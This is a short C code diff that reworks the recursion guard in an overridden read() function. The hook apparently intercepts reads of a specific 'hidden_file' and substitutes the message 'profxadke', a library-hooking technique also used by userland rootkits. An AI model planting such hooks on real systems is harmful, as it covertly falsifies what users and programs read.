@@ -28,11 +28,6 @@ ssize_t read(int fd, void *buf, size_t count) {
         orig_read = dlsym(RTLD_NEXT, "read");
     }
 
-    // Avoid recursive reads
-    if (is_reading_hidden_file) {
-        return orig_read(fd, buf, count);
-    }
-
     // Obtain the file path from the file descriptor
     char path[256];
     snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
@@ -43,7 +38,12 @@ ssize_t read(int fd, void *buf, size_t count) {
 
         // Check if it's the target file for modification
         if (strcmp(real_path, hidden_file) == 0) {
-            is_reading_hidden_file = 1; // Set flag to avoid infinite loop
+            // Avoid recursive calls by checking the flag
+            if (is_reading_hidden_file) {
+                return orig_read(fd, buf, count);
+            }
+            
+            is_reading_hidden_file = 1; // Set flag to avoid recursion
             const char *message = "profxadke\n";
             size_t msg_len = strlen(message);
 
